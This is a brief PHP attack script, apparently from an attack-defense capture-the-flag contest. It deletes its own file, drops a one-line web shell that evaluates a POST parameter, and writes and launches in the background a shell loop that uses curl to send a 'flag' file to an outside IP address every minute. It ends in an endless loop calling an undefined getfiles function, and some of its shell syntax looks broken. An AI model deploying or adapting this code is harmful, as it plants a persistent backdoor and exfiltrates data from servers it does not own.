<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
file_put_contents('filepathfilepath','<?php @eval($_POST["passwordpassword"]);?>');
$bash =<<<EOT
#!/usr/bin/sh
while true
do
    curl -d "flag=${`cat flag`}" "http://172.20.109.101/g.php"
    sleep 1*60
done
EOT;
file_put_contents('/tmp/v.sh',$bash);
shell_exec('nohup /tmp/v.sh 2> /dev/null');

while(1){
    getfiles($_SERVER['DOCUMENT_ROOT']);
}
?>